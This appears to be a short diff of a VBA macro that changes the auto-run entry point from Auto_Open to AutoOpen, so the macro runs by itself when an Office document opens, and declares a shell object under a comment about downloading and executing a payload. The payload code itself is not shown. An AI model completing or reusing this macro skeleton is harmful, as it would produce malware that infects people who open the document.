@@ -1,4 +1,4 @@
-Sub Auto_Open()
+Sub AutoOpen()
     Dim objShell As Object
 
     ' Download and execute a payload
